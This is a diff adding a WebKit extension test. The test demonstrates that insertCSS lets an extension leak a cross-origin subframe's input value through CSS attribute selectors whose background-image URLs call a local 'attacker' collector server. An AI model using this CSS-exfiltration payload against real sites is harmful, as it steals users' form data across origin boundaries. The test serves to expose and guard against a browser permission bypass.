+// Companion to InsertCSSInAllFramesRespectsPerFramePermissions above. That test proves insertCSS
+// can change a cross-origin subframe's rendering despite zero permission; this one proves that
+// bypass has a concrete, demonstrable data-exfiltration consequence, not just a cosmetic one.
+// The cross-origin subframe holds a test "secret" value in an <input value> attribute. The
+// extension -- still granted permission for ONLY the main frame's origin -- injects CSS
+// attribute-selector rules into the subframe via the same unchecked insertCSS path. Each
+// candidate rule's background-image URL encodes a different guessed value; browsers eagerly
+// fetch a background-image URL the moment its rule's selector matches, regardless of whether
+// the image itself loads successfully, which is the real, published basis of CSS-only
+// exfiltration attacks. A second, independent HTTP server (the "attacker's" collection
+// endpoint, a different origin/port than either frame) observes which request actually
+// arrives. A real HTTP request for the correct value, and none for the decoys, proves genuine
+// character-level data extraction through a pure CSS side-channel with zero script access to
+// the subframe at any point -- not an assumption about what might be possible.
+TEST(WKWebExtensionAPIScripting, InsertCSSExfiltratesCrossOriginAttributeData)
+{
+    SetForScope siteIsolation { Util::shouldEnableSiteIsolationForWebExtensionsTest, true };
+
+    auto *manifest = @{
+        @"manifest_version": @3,
+
+        @"name": @"Scripting Exfiltration PoC",
+        @"description": @"Scripting Exfiltration PoC",
+        @"version": @"1",
+
+        @"permissions": @[ @"scripting" ],
+        @"host_permissions": @[ @"*://127.0.0.1/*" ],
+
+        @"background": @{
+            @"scripts": @[ @"background.js" ],
+            @"type": @"module",
+            @"persistent": @NO,
+        },
+    };
+
+    // The independent "attacker" collection endpoint. A real exfiltration target would be a
+    // wholly separate origin; here it's simply a second local server, which is sufficient to
+    // prove a real, independent network request happens -- the subframe's own origin/process
+    // never sees or handles this request at all.
+    __block String leakedPath;
+    __block bool gotRequest = false;
+    TestWebKitAPI::HTTPServer collector([&leakedPath, &gotRequest](TestWebKitAPI::Connection connection) {
+        connection.receiveHTTPRequest([&leakedPath, &gotRequest, connection](Vector<char>&& request) {
+            leakedPath = TestWebKitAPI::HTTPServer::parsePath(request);
+            gotRequest = true;
+            connection.send(TestWebKitAPI::HTTPResponse("ok"_s).serialize());
+        });
+    });
+    uint16_t collectorPort = collector.port();
+
+    TestWebKitAPI::HTTPServer server({
+        { "/"_s, { { { "Content-Type"_s, "text/html"_s } },
+            "<script>onload = () => { const frame = document.createElement('iframe'); frame.src = 'http://localhost:' + window.location.port + '/frame.html'; document.body.appendChild(frame); };</script>"_s } },
+        { "/frame.html"_s, { { { "Content-Type"_s, "text/html"_s } },
+            "<body style='background-color: blue'><input id='secret' value='X'></body>"_s } },
+    }, TestWebKitAPI::HTTPServer::Protocol::Http);
+
+    auto *backgroundScript = Util::constructScript(@[
+        [NSString stringWithFormat:@"const collectorPort = %u", (unsigned)collectorPort],
+
+        @"function getBackgroundColor() { return window.getComputedStyle(document.body).getPropertyValue('background-color') }",
+
+        @"browser.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {",
+        @"  if (tab.status !== 'complete')",
+        @"    return",
+
+        @"  for (let attempt = 0; attempt < 200; ++attempt) {",
+        @"    const results = await browser.scripting.executeScript({ target: { tabId, allFrames: true }, func: getBackgroundColor })",
+        @"    if (results.length === 2)",
+        @"      break",
+        @"    await new Promise((resolve) => setTimeout(resolve, 50))",
+        @"  }",
+
+        // One correct guess ('X', the subframe's real secret) plus four decoys. Each rule's
+        // background-image points at a distinct path on the independent collector server.
+        @"  const guesses = ['a', 'b', 'X', 'Y', 'Z']",
+        @"  const css = guesses.map((g) => `input[value^=\"${g}\"] { background-image: url(http://127.0.0.1:${collectorPort}/leak-${g}) }`).join(' ')",
+
+        @"  await browser.scripting.insertCSS({ target: { tabId, allFrames: true }, css })",
+
+        @"  browser.test.sendMessage('Injected')",
+        @"})",
+
+        @"browser.test.sendMessage('Load Tab')",
+    ]);
+
+    auto *resources = @{ @"background.js": backgroundScript };
+
+    auto manager = Util::loadExtension(manifest, resources);
+
+    auto *urlRequest = server.requestWithLocalhost();
+    auto *url = urlRequest.URL;
+
+    auto *matchPattern = [WKWebExtensionMatchPattern matchPatternWithScheme:url.scheme host:url.host path:@"/*"];
+    [manager.get().context setPermissionStatus:WKWebExtensionContextPermissionStatusGrantedExplicitly forMatchPattern:matchPattern];
+
+    [manager runUntilTestMessage:@"Load Tab"];
+
+    [manager.get().defaultTab.webView loadRequest:urlRequest];
+
+    [manager runUntilTestMessage:@"Injected"];
+
+    // Give the subframe's eager background-image fetch time to actually reach the collector.
+    TestWebKitAPI::Util::run(&gotRequest);
+
+    EXPECT_TRUE(gotRequest);
+    EXPECT_WK_STREQ(leakedPath, "/leak-X"_s);
+}
